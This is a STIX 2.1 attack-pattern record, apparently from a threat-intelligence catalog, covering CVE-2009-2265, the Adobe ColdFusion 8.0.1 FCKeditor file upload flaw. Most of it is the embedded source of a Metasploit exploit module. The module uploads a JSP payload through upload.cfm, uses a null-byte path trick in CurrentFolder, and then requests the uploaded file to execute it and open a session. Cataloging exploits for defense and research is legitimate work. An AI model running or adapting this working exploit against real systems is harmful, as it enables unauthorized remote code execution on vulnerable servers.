{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ed220b6a-f610-4779-8c3f-60a205f4270f",
    "created": "2024-08-14T16:52:08.929875Z",
    "modified": "2024-08-14T16:52:08.929879Z",
    "name": "ColdFusion 8.0.1 Arbitrary File Upload and Execute",
    "description": " This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload and Execute vulnerability. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/http/coldfusion_fckeditor.rb",
            "external_id": "coldfusion_fckeditor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2009-2265"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'ColdFusion 8.0.1 Arbitrary File Upload and Execute',\n      'Description'    => %q{\n          This module exploits the Adobe ColdFusion 8.0.1 FCKeditor 'CurrentFolder' File Upload\n        and Execute vulnerability.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'Platform'       => 'win',\n      'Privileged'     => true,\n      'References'     =>\n        [\n          [ 'CVE', '2009-2265' ],\n          [ 'OSVDB', '55684'],\n        ],\n      'Targets'        =>\n        [\n          [ 'Universal Windows Target',\n            {\n              'Arch'     => ARCH_JAVA,\n              'Payload'  =>\n                {\n                  'DisableNops' => true,\n                },\n            }\n          ],\n        ],\n      'DefaultOptions' =>\n        {\n          'SHELL' => 'cmd.exe'\n        },\n      'DefaultTarget'  => 0,\n      'DisclosureDate' => '2009-07-03'\n    ))\n\n    register_options(\n      [\n        OptString.new('FCKEDITOR_DIR', [ false, 'The path to upload.cfm ', '/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm' ]),\n      ])\n  end\n\n  def exploit\n\n    page  = rand_text_alpha_upper(rand(10) + 1) + \".jsp\"\n\n    dbl = Rex::MIME::Message.new\n    dbl.add_part(payload.encoded, \"application/x-java-archive\", nil, \"form-data; name=\\\"newfile\\\"; filename=\\\"#{rand_text_alpha_upper(8)}.txt\\\"\")\n    file = dbl.to_s\n    file.strip!\n\n    print_status(\"Sending our POST request...\")\n\n    res = send_request_cgi(\n      {\n        'uri'\t\t=> normalize_uri(datastore['FCKEDITOR_DIR']),\n        'query'\t\t=> \"Command=FileUpload&Type=File&CurrentFolder=/#{page}%00\",\n        'version'\t=> '1.1',\n        'method'\t=> 'POST',\n        'ctype'\t\t=> 'multipart/form-data; boundary=' + dbl.bound,\n        'data'\t\t=> file,\n      }, 5)\n\n    if ( res and res.code == 200 and res.body =~ /OnUploadCompleted/ )\n      print_status(\"Upload succeeded! Executing payload...\")\n\n      send_request_raw(\n        {\n          # default path in Adobe ColdFusion 8.0.1.\n          'uri'\t\t=> '/userfiles/file/' + page,\n          'method'\t=> 'GET',\n        }, 5)\n\n      handler\n    else\n      print_error(\"Upload Failed...\")\n      return\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2009-07-03",
    "x_mitre_platforms": [
        "win'"
    ]
}